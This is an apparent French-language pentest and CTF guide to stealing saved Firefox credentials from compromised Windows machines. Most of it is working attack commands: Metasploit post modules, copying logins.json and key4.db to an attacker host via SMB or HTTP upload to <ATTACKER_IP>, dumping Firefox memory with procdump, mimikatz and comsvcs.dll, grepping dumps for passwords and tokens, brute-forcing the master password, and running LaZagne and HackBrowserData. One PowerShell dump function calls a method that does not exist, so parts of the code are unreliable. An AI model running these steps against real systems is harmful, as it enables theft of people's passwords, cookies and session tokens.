# EXTRACTION DE CREDENTIALS FIREFOX SUR WINDOWS

## <mark style="color:red;">EXTRACTION DE CREDENTIALS FIREFOX SUR WINDOWS</mark>

***

### <mark style="color:blue;">1. INTRODUCTION ET CONTEXTE</mark>

#### 1.1 Vue d'ensemble

L'extraction de credentials Firefox est une technique essentielle en pentest et CTF. Firefox stocke les mots de passe de manière chiffrée dans des bases de données SQLite, mais plusieurs vecteurs d'attaque permettent leur récupération.

**Pourquoi cibler Firefox ?**

* Stockage local des credentials (pas de cloud obligatoire comme Chrome)
* Système de chiffrement NSS (Network Security Services)
* Possibilité d'extraction même sans master password dans certains cas
* Présence fréquente dans environnements professionnels et CTF

#### 1.2 Cas d'Usage

* **Post-exploitation** après compromission d'une machine Windows
* **Capture de sessions actives** via processus en mémoire
* **Analyse forensique** de disques ou images système
* **Escalade de privilèges** via credentials réutilisés
* **Pivot** vers d'autres systèmes avec credentials découverts

#### 1.3 Prérequis

**Accès nécessaire :**

* Shell sur la machine cible (cmd, PowerShell, ou meterpreter)
* Privilèges utilisateur minimum (accès au profil utilisateur)
* Idéalement : session active de l'utilisateur

**Outils sur machine d'attaque :**

* Kali Linux ou distribution pentest
* Metasploit Framework
* Python 3.x
* Outils de décryptage (firefox\_decrypt, etc.)

***

### <mark style="color:blue;">2. ARCHITECTURE DU STOCKAGE FIREFOX</mark>

#### 2.1 Emplacement des Fichiers

**Chemin du profil Firefox sur Windows :**

```
C:\Users\<USERNAME>\AppData\Roaming\Mozilla\Firefox\Profiles\<PROFILE_ID>.default
```

**Exemple réel :**

```
C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default
```

**Localisation rapide :**

```powershell
# PowerShell
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" -Recurse

# CMD
dir "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" /s
```

#### 2.2 Fichiers Critiques

| Fichier                | Description                                                    | Format | Importance |
| ---------------------- | -------------------------------------------------------------- | ------ | ---------- |
| **logins.json**        | Stocke les credentials chiffrés (usernames et passwords)       | JSON   | ⭐⭐⭐⭐⭐      |
| **key4.db**            | Base de données contenant la master key de chiffrement         | SQLite | ⭐⭐⭐⭐⭐      |
| **cert9.db**           | Certificats de sécurité (nécessaire pour certains décryptages) | SQLite | ⭐⭐⭐⭐       |
| **cookies.sqlite**     | Cookies de navigation (sessions, tokens)                       | SQLite | ⭐⭐⭐⭐       |
| **places.sqlite**      | Historique de navigation et bookmarks                          | SQLite | ⭐⭐⭐        |
| **formhistory.sqlite** | Historique des formulaires (usernames possibles)               | SQLite | ⭐⭐⭐        |
| **permissions.sqlite** | Permissions de sites web                                       | SQLite | ⭐⭐         |
| **favicons.sqlite**    | Icônes de favoris                                              | SQLite | ⭐          |

#### 2.3 Structure de logins.json

**Exemple de structure :**

```json
{
  "nextId": 3,
  "logins": [
    {
      "id": 1,
      "hostname": "https://example.com",
      "httpRealm": null,
      "formSubmitURL": "https://example.com/login",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYI...",
      "encryptedPassword": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYI...",
      "guid": "{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}",
      "encType": 1,
      "timeCreated": 1609459200000,
      "timeLastUsed": 1609459200000,
      "timePasswordChanged": 1609459200000,
      "timesUsed": 5
    }
  ]
}
```

**Chiffrement utilisé :**

* **3DES** (Triple DES) en mode CBC pour anciennes versions
* **AES-256** en mode CBC pour versions récentes
* Master key stockée dans **key4.db** (NSS database)
* Optionnellement protégé par un **master password**

#### 2.4 Structure de key4.db

Base de données SQLite NSS (Network Security Services) contenant :

* **Master encryption key** (chiffrée si master password)
* **Salt** pour dérivation de clé
* **Metadata** de chiffrement

**Visualisation :**

```bash
sqlite3 key4.db
.tables
# Output: metaData, nssPrivate, nssPublic

SELECT * FROM metaData;
```

***

### <mark style="color:blue;">3. MÉTHODES D'EXTRACTION VIA METASPLOIT</mark>

#### 3.1 Module firefox\_creds (Principal)

**Le module de référence pour extraction automatique.**

**Utilisation Basique**

```bash
# Lancer msfconsole
msfconsole

# Utiliser le module
use post/multi/gather/firefox_creds

# Configurer la session
set SESSION 1
set VERBOSE true

# Options additionnelles (optionnel)
show options
set EXTDLL true  # Extraire aussi les DLL de décryptage NSS

# Lancer l'extraction
run
```

**Sortie Typique**

```
[*] Determining session platform and type
[*] Searching every possible account on the target system
[*] Checking for Firefox profile in: C:\Users\Chase\AppData\Roaming\Mozilla\

[+] Found profile: C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default

[*] Downloading: cert9.db
[+] Downloaded cert9.db: /root/.msf4/loot/20260201122613_default_10.129.96.157_ff.77nc64t5.cert_730764.bin

[*] Downloading: cookies.sqlite
[+] Downloaded cookies.sqlite: /root/.msf4/loot/20260201122614_default_10.129.96.157_ff.77nc64t5.cook_829003.bin

[*] Downloading: key4.db
[+] Downloaded key4.db: /root/.msf4/loot/20260201122614_default_10.129.96.157_ff.77nc64t5.key4_696579.bin

[*] Downloading: logins.json
[+] Downloaded logins.json: /root/.msf4/loot/20260201122615_default_10.129.96.157_ff.77nc64t5.logi_123456.bin

[*] Post module execution completed
```

**Fichiers Récupérés**

Les fichiers sont automatiquement stockés dans :

```bash
/root/.msf4/loot/

# Lister les fichiers récupérés
ls -lah /root/.msf4/loot/ | grep -E "(cert|key4|cook|logi)"
```

#### 3.2 Autres Modules Metasploit Utiles

**post/firefox/gather/passwords**

**Pour sessions Firefox XPCOM actives (exploitation navigateur).**

```bash
use post/firefox/gather/passwords
set SESSION <firefox_xpcom_session>
run
```

**Note :** Nécessite une session JavaScript privilegiée dans Firefox (exploits spécifiques).

**post/firefox/gather/cookies**

**Extraction directe de cookies depuis session Firefox.**

```bash
use post/firefox/gather/cookies
set SESSION <firefox_session>
run
```

**post/windows/gather/forensics/browser\_history**

**Extraction multi-navigateurs (Firefox, Chrome, Edge, IE).**

```bash
use post/windows/gather/forensics/browser_history
set SESSION 1
run
```

Récupère :

* Historique de navigation
* Cookies
* Téléchargements
* Recherches

#### 3.3 Recherche de Modules Firefox

```bash
# Dans msfconsole
search firefox

# Filtrer par type
search type:post firefox
search type:exploit firefox

# Modules pertinents pour credentials :
# - post/multi/gather/firefox_creds
# - post/firefox/gather/passwords
# - post/firefox/gather/cookies
# - post/windows/gather/forensics/browser_history
```

***

### <mark style="color:blue;">4. EXTRACTION VIA FICHIERS (OFFLINE)</mark>

#### 4.1 Téléchargement Manuel des Fichiers

**Via Meterpreter**

```bash
# Localiser le profil Firefox
shell
dir "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" /s
exit

# Télécharger les fichiers critiques
download "C:\\Users\\Chase\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\77nc64t5.default\\key4.db" /tmp/key4.db
download "C:\\Users\\Chase\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\77nc64t5.default\\logins.json" /tmp/logins.json
download "C:\\Users\\Chase\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\77nc64t5.default\\cert9.db" /tmp/cert9.db
download "C:\\Users\\Chase\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\77nc64t5.default\\cookies.sqlite" /tmp/cookies.sqlite
```

**Via PowerShell (Shell Basique)**

```powershell
# Compresser tout le profil
$profilePath = "C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default"
Compress-Archive -Path $profilePath -DestinationPath C:\temp\firefox_profile.zip

# Transfert via SMB (préparer serveur SMB sur Kali)
# Sur Kali : impacket-smbserver share . -smb2support
copy C:\temp\firefox_profile.zip \\<ATTACKER_IP>\share\

# Ou via HTTP (upload vers serveur Python)
# Sur Kali : python3 -m uploadserver 80
Invoke-WebRequest -Uri "http://<ATTACKER_IP>/upload" -Method POST -InFile C:\temp\firefox_profile.zip
```

**Via CMD/Certutil**

```cmd
# Encoder en base64
certutil -encode C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\key4.db C:\temp\key4.b64

# Afficher et copier manuellement
type C:\temp\key4.b64

# Décoder sur Kali
base64 -d key4.b64 > key4.db
```

#### 4.2 Décryptage avec firefox\_decrypt

**firefox\_decrypt est l'outil de référence pour décrypter les credentials Firefox offline.**

**Installation**

```bash
# Sur Kali Linux
cd /opt
git clone https://github.com/unode/firefox_decrypt
cd firefox_decrypt

# Vérifier les dépendances
python3 --version  # Python 3.6+
pip3 list | grep -i "cryptography\|pyasn1"

# Installer si nécessaire
pip3 install cryptography pyasn1
```

**Préparation du Profil**

```bash
# Créer un dossier de profil temporaire
mkdir /tmp/firefox_profile

# Copier les fichiers récupérés depuis Metasploit loot
cp /root/.msf4/loot/*cert*.bin /tmp/firefox_profile/cert9.db
cp /root/.msf4/loot/*key4*.bin /tmp/firefox_profile/key4.db
cp /root/.msf4/loot/*logi*.bin /tmp/firefox_profile/logins.json

# Ou depuis téléchargement direct
cp /tmp/key4.db /tmp/firefox_profile/
cp /tmp/logins.json /tmp/firefox_profile/
cp /tmp/cert9.db /tmp/firefox_profile/

# Vérifier les fichiers
ls -lah /tmp/firefox_profile/
```

**Exécution - Sans Master Password**

```bash
cd /opt/firefox_decrypt
python3 firefox_decrypt.py /tmp/firefox_profile
```

**Sortie attendue :**

```
Website:   https://example.com
Username: 'admin@example.com'
Password: 'SuperSecretPass123!'

Website:   https://github.com
Username: 'hacker_user'
Password: 'MyGitHubP@ssw0rd'

Website:   https://mail.google.com
Username: 'victim@gmail.com'
Password: 'Gmail_Passw0rd_2024'
```

**Exécution - Avec Master Password**

Si un master password est configuré :

```bash
python3 firefox_decrypt.py /tmp/firefox_profile

# Output:
# Master Password for profile /tmp/firefox_profile: 
# [Entrer le master password si connu]
```

**Options de contournement :**

1. **Bruteforce** avec wordlist (voir section suivante)
2. **Extraction depuis mémoire** si Firefox est en cours d'exécution
3. **Keylogging** sur la machine compromise
4. **Social engineering** si accès utilisateur

**Bruteforce du Master Password**

```bash
# Script de bruteforce simple
#!/bin/bash
WORDLIST="/usr/share/wordlists/rockyou.txt"
PROFILE="/tmp/firefox_profile"

while IFS= read -r password; do
    echo "Trying: $password"
    echo "$password" | python3 /opt/firefox_decrypt/firefox_decrypt.py "$PROFILE" 2>&1 | grep -q "Website:"
    if [ $? -eq 0 ]; then
        echo "[+] Master password found: $password"
        break
    fi
done < "$WORDLIST"
```

**Outils dédiés :**

* **john** avec format firefox
* **hashcat** (nécessite extraction du hash)

**Extraction vers fichier**

```bash
# Sauvegarder les credentials dans un fichier
python3 firefox_decrypt.py /tmp/firefox_profile > /tmp/firefox_credentials.txt

# Format CSV pour import
python3 firefox_decrypt.py /tmp/firefox_profile | awk '/Website:/ {url=$2} /Username:/ {user=$2} /Password:/ {pass=$2; print url","user","pass}' > credentials.csv
```

#### 4.3 Alternatives à firefox\_decrypt

**firepwd (Python)**

```bash
git clone https://github.com/lclevy/firepwd
cd firepwd
python3 firepwd.py -d /tmp/firefox_profile
```

**Note :** Fonctionne principalement avec anciennes versions de Firefox (key3.db).

**LaZagne**

```bash
# Sur Windows (transférer l'exe)
laZagne.exe browsers

# Sur Kali avec profil extrait
cd /opt
git clone https://github.com/AlessandroZ/LaZagne
cd LaZagne/Linux
python3 laZagne.py browsers -firefox -path /tmp/firefox_profile
```

***

### <mark style="color:blue;">5. EXTRACTION VIA MÉMOIRE (PROCESS DUMP)</mark>

**Lorsque Firefox est en cours d'exécution, les credentials peuvent être présents en clair dans la mémoire des processus.**

#### 5.1 Identification des Processus Firefox

**Via netstat (Windows)**

```cmd
# Rechercher connexions locales (IPC entre processus Firefox)
netstat -ano | findstr ESTABLISHED | findstr "127.0.0.1"

# Exemple de sortie :
# TCP    127.0.0.1:49672    127.0.0.1:49673    ESTABLISHED    6500
# TCP    127.0.0.1:49673    127.0.0.1:49672    ESTABLISHED    6500
```

**Analyse :**

* PID **6500** : Processus Firefox avec connexions IPC
* Connexions **127.0.0.1** : Communication entre processus Firefox (multi-process architecture)
* Ces processus contiennent potentiellement des credentials en mémoire

**Via PowerShell**

```powershell
# Lister tous les processus Firefox
Get-Process firefox | Select-Object Id, ProcessName, WorkingSet, CPU

# Exemple de sortie :
# Id   ProcessName WorkingSet         CPU
# --   ----------- ----------         ---
# 6500 firefox     245760000          12.34
# 6760 firefox     156672000          8.91
# 7024 firefox     198656000          15.67
# 6336 firefox     187392000          10.23
```

**Via Meterpreter**

```bash
# Lister les processus
ps | grep firefox

# Afficher détails
ps -S firefox
```

#### 5.2 Dump avec Procdump (Microsoft Sysinternals)

**Procdump est l'outil officiel Microsoft pour dumper la mémoire des processus.**

**Téléchargement de Procdump**

```bash
# Sur Kali - Préparer le serveur HTTP
cd /tmp
wget https://download.sysinternals.com/files/Procdump.zip
unzip Procdump.zip
python3 -m http.server 80
```

```powershell
# Sur Windows cible - Télécharger
certutil -urlcache -f http://<KALI_IP>/procdump64.exe C:\temp\procdump.exe

# Ou via PowerShell
Invoke-WebRequest -Uri "http://<KALI_IP>/procdump64.exe" -OutFile "C:\temp\procdump.exe"
```

**Dump d'un Processus Spécifique**

```cmd
# Dumper un processus Firefox (PID 6500)
C:\temp\procdump.exe -accepteula -ma 6500 C:\temp\firefox_6500.dmp

# Options :
# -accepteula : Accepter EULA automatiquement
# -ma : Full dump (toute la mémoire)
# -mm : Mini dump (plus petit, moins de données)
```

**Sortie attendue :**

```
ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[11:30:45] Dump 1 initiated: C:\temp\firefox_6500.dmp
[11:30:47] Dump 1 complete: 256 MB written in 2.1 seconds
```

**Dump de Tous les Processus Firefox**

```cmd
# Méthode 1 : Dump automatique de tous les processus firefox.exe
procdump.exe -accepteula -ma firefox C:\temp\

# Méthode 2 : Script batch pour dump multiple
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq firefox.exe" ^| findstr firefox') do procdump.exe -accepteula -ma %i C:\temp\firefox_%i.dmp
```

**Transfert des Dumps vers Kali**

```bash
# Via Meterpreter
download C:\\temp\\firefox_6500.dmp /tmp/

# Via SMB
# Sur Kali : impacket-smbserver share /tmp -smb2support
# Sur Windows : copy C:\temp\firefox_*.dmp \\<KALI_IP>\share\
```

#### 5.3 Dump avec Mimikatz

**Via Meterpreter (load kiwi)**

```bash
# Migrer vers un processus Firefox
ps | grep firefox
migrate 6500

# Charger Mimikatz (kiwi)
load kiwi

# Extraire les credentials de tous les processus
creds_all

# Dump mémoire spécifique
kiwi_cmd "process::dump /pid:6500 /file:C:\\temp\\firefox.dmp"
```

**Upload et Exécution Standalone**

```bash
# Upload mimikatz sur la cible
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\temp\\mimikatz.exe

# Exécuter le dump
shell
cd C:\temp
mimikatz.exe

# Dans Mimikatz :
privilege::debug
process::list
process::dump /pid:6500 /file:firefox_6500.dmp
exit
```

**Commande one-liner :**

```cmd
mimikatz.exe "privilege::debug" "process::dump /pid:6500 /file:C:\temp\firefox.dmp" "exit"
```

#### 5.4 Dump avec PowerShell (Natif Windows)

**Méthode rundll32 (nécessite privilèges admin)**

```powershell
# Dump avec comsvcs.dll
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 6500 C:\temp\firefox_6500.dmp full

# Syntaxe : rundll32 comsvcs.dll, MiniDump <PID> <OUTPUT_FILE> full
```

**Avantages :**

* Outil natif Windows (pas de détection d'outil tiers)
* Pas besoin de télécharger Procdump
* Fonctionne sur toutes les versions Windows récentes

**Inconvénients :**

* Nécessite privilèges admin
* Détecté par certains EDR (appel suspect à comsvcs.dll)

**Méthode Out-Minidump (PowerShell)**

```powershell
# Script PowerShell pour dump
function Get-ProcessDump {
    param(
        [Parameter(Mandatory=$true)]
        [int]$ProcessId,
        [Parameter(Mandatory=$true)]
        [string]$OutputFile
    )
    
    $proc = Get-Process -Id $ProcessId
    $file = [System.IO.File]::Create($OutputFile)
    
    [Diagnostics.Process]::GetProcessById($ProcessId).MiniDumpWriteDump(
        $file.SafeFileHandle,
        [Diagnostics.MiniDumpType]::WithFullMemory
    )
    
    $file.Close()
}

Get-ProcessDump -ProcessId 6500 -OutputFile "C:\temp\firefox.dmp"
```

#### 5.5 Analyse du Dump Mémoire

**Extraction avec strings (Linux)**

```bash
# Rechercher des patterns de credentials
strings firefox_6500.dmp | grep -i "password" | head -50
strings firefox_6500.dmp | grep -i "login" | head -50
strings firefox_6500.dmp | grep -i "username" | head -50

# Rechercher des URLs (credentials potentiels dans URLs)
strings firefox_6500.dmp | grep -E 'https?://' | grep -E '(user|pass|login|auth)' | head -100

# Rechercher des tokens/hashes
strings firefox_6500.dmp | grep -E '[a-zA-Z0-9]{32,}' | head -100

# Rechercher des patterns email
strings firefox_6500.dmp | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | head -50
```

**Recherche de Patterns Spécifiques**

**Cookies et tokens de session :**

```bash
strings firefox_6500.dmp | grep -i "cookie:" > cookies.txt
strings firefox_6500.dmp | grep -i "set-cookie:" >> cookies.txt
strings firefox_6500.dmp | grep -i "authorization:" > auth_headers.txt
strings firefox_6500.dmp | grep -i "bearer " >> auth_headers.txt
```

**Formulaires POST (credentials en clair) :**

```bash
strings firefox_6500.dmp | grep -i "username=" > form_data.txt
strings firefox_6500.dmp | grep -i "password=" >> form_data.txt
strings firefox_6500.dmp | grep -i "email=" >> form_data.txt
strings firefox_6500.dmp | grep -B5 -A5 "POST " | grep -E "(username|password|email)" >> form_data.txt
```

**JSON credentials (API responses) :**

```bash
strings firefox_6500.dmp | grep -E '\"(user|pass|token|key|secret)\":' > json_creds.txt
```

**Analyse avec Volatility (Forensique Avancée)**

```bash
# Installer Volatility 3
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
pip3 install -r requirements.txt

# Analyser le dump
python3 vol.py -f /tmp/firefox_6500.dmp windows.pslist
python3 vol.py -f /tmp/firefox_6500.dmp windows.cmdline
python3 vol.py -f /tmp/firefox_6500.dmp windows.envars

# Dump des régions mémoire spécifiques
python3 vol.py -f /tmp/firefox_6500.dmp windows.memmap --pid 6500 --dump
```

**Recherche Contextuelle**

```bash
# Chercher autour des mots-clés
strings -e l firefox_6500.dmp | grep -B10 -A10 "password" > password_context.txt
strings -e l firefox_6500.dmp | grep -B10 -A10 "login" > login_context.txt

# -e l : Unicode (little-endian) strings
```

***

### <mark style="color:blue;">6. OUTILS DE DÉCRYPTAGE</mark>

#### 6.1 Comparatif des Outils

| Outil                | Langage | Avantages                                                             | Inconvénients                                          | Cas d'usage                       |
| -------------------- | ------- | --------------------------------------------------------------------- | ------------------------------------------------------ | --------------------------------- |
| **firefox\_decrypt** | Python  | Open source, bien maintenu, support NSS moderne, gère master password | Nécessite fichiers complets, Python 3.6+               | ⭐ Offline decryption (recommandé) |
| **LaZagne**          | Python  | Multi-applications, interface simple, standalone exe                  | Détection antivirus, moins fiable pour Firefox récent  | Post-exploitation rapide          |
| **firepwd**          | Python  | Léger, pas de dépendances lourdes                                     | Versions anciennes uniquement (key3.db), plus maintenu | Anciennes versions Firefox        |
| **HackBrowserData**  | Go      | Moderne, multi-navigateurs, rapide, cross-platform                    | Moins de contrôle granulaire                           | Extraction multi-navigateurs      |
| **Mimikatz**         | C       | Intégré dans beaucoup de workflows pentest                            | Fortement détecté, nécessite privilèges                | Dump mémoire live                 |

#### 6.2 firefox\_decrypt (Détaillé)

**Outil recommandé - Décryptage offline des credentials Firefox**

**Installation Complète**

```bash
# Cloner le repository
cd /opt
git clone https://github.com/unode/firefox_decrypt
cd firefox_decrypt

# Vérifier Python
python3 --version  # Minimum 3.6

# Installer dépendances
pip3 install --upgrade pip
pip3 install cryptography pyasn1

# Test de fonctionnement
python3 firefox_decrypt.py --help
```

**Utilisation Avancée**

**Options disponibles :**

```bash
python3 firefox_decrypt.py --help

# Options principales :
# -p, --profile <path>    : Chemin vers le profil Firefox
# -l, --list              : Lister les profils disponibles
# -e, --export <file>     : Exporter vers fichier
# -f, --format <format>   : Format de sortie (human, json, csv)
# -n, --no-interactive    : Mode non-interactif
# -v, --verbose           : Mode verbeux
# -q, --quiet             : Mode silencieux
```

**Exemples d'utilisation :**

```bash
# Décryptage standard
python3 firefox_decrypt.py /tmp/firefox_profile

# Export JSON
python3 firefox_decrypt.py -f json /tmp/firefox_profile > creds.json

# Export CSV
python3 firefox_decrypt.py -f csv /tmp/firefox_profile > creds.csv

# Mode silencieux (pour scripting)
python3 firefox_decrypt.py -q -n /tmp/firefox_profile

# Avec master password en variable
export FF_MASTER_PASS="my_master_password"
python3 firefox_decrypt.py -n /tmp/firefox_profile
```

**Format JSON output :**

```json
[
  {
    "hostname": "https://example.com",
    "username": "admin@example.com",
    "password": "SuperSecret123!",
    "formSubmitURL": "https://example.com/login",
    "usernameField": "email",
    "passwordField": "password"
  }
]
```

**Gestion du Master Password**

**Si master password configuré :**

1. **Interactif :** Le script demandera le password
2.  **Variable d'environnement :**

    ```bash
    export FF_MASTER_PASS="master_password"python3 firefox_decrypt.py -n /tmp/firefox_profile
    ```
3.  **Fichier :**

    ```bash
    echo "master_password" > /tmp/mp.txtcat /tmp/mp.txt | python3 firefox_decrypt.py /tmp/firefox_profile
    ```

**Bruteforce du master password :**

```bash
#!/bin/bash
# bruteforce_firefox_master.sh

PROFILE="/tmp/firefox_profile"
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT="found_password.txt"

echo "[*] Starting Firefox master password bruteforce..."
echo "[*] Profile: $PROFILE"
echo "[*] Wordlist: $WORDLIST"

count=0
while IFS= read -r password; do
    count=$((count+1))
    if [ $((count % 1000)) -eq 0 ]; then
        echo "[*] Tried $count passwords..."
    fi
    
    # Test password
    result=$(echo "$password" | python3 /opt/firefox_decrypt/firefox_decrypt.py "$PROFILE" 2>&1)
    
    if echo "$result" | grep -q "Website:"; then
        echo "[+] SUCCESS! Master password found: $password"
        echo "$password" > "$OUTPUT"
        echo "$result"
        break
    fi
done < "$WORDLIST"

echo "[*] Bruteforce completed. Tried $count passwords."
```

#### 6.3 LaZagne

**Outil multi-applications pour extraction de credentials**

**Installation et Utilisation Linux**

```bash
# Cloner
cd /opt
git clone https://github.com/AlessandroZ/LaZagne
cd LaZagne/Linux

# Lancer
python3 laZagne.py all

# Firefox uniquement
python3 laZagne.py browsers -firefox

# Avec profil spécifique
python3 laZagne.py browsers -firefox -path /tmp/firefox_profile

# Export JSON
python3 laZagne.py all -oJ -output /tmp/lazagne_output.json
```

**Utilisation Windows**

```bash
# Télécharger l'exécutable
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe

# Transférer sur cible
# Via Meterpreter :
upload LaZagne.exe C:\\temp\\

# Exécuter
shell
C:\temp\LaZagne.exe all
C:\temp\LaZagne.exe browsers
C:\temp\LaZagne.exe browsers -firefox

# Export
C:\temp\LaZagne.exe all -oJ -output C:\temp\output.json
```

**Modules supportés :**

* Browsers : Firefox, Chrome, Edge, IE, Opera
* Chats : Skype, Pidgin
* Databases : SQLite databases, Robomongo
* Games : Galcon Fusion, Kalypsomedia
* Git : Git credentials
* Mail : Outlook, Thunderbird
* Sysadmin : FileZilla, OpenVPN, PuTTY, WinSCP
* WiFi : Windows WiFi passwords

#### 6.4 HackBrowserData

**Outil moderne Go pour extraction multi-navigateurs**

**Installation**

```bash
# Méthode 1 : Compilation depuis source
git clone https://github.com/moonD4rk/HackBrowserData
cd HackBrowserData
go build

# Méthode 2 : Télécharger release
wget https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.5/hack-browser-data-linux-amd64.tar.gz
tar -xzf hack-browser-data-linux-amd64.tar.gz
```

**Utilisation**

```bash
# Extraction complète (tous navigateurs)
./hack-browser-data

# Firefox uniquement
./hack-browser-data -b firefox

# Export JSON
./hack-browser-data -b firefox -f json -dir /tmp/output

# Avec profil spécifique
./hack-browser-data -b firefox -p /tmp/firefox_profile -f json

# Verbose mode
./hack-browser-data -b firefox -v
```

**Navigateurs supportés :**

* Firefox
* Chrome / Chromium
* Edge
* 360 Browser
* QQ Browser
* Brave
* Opera

**Données extraites :**

* Login credentials
* Cookies
* Bookmarks
* History
* Credit cards
* Download history

***
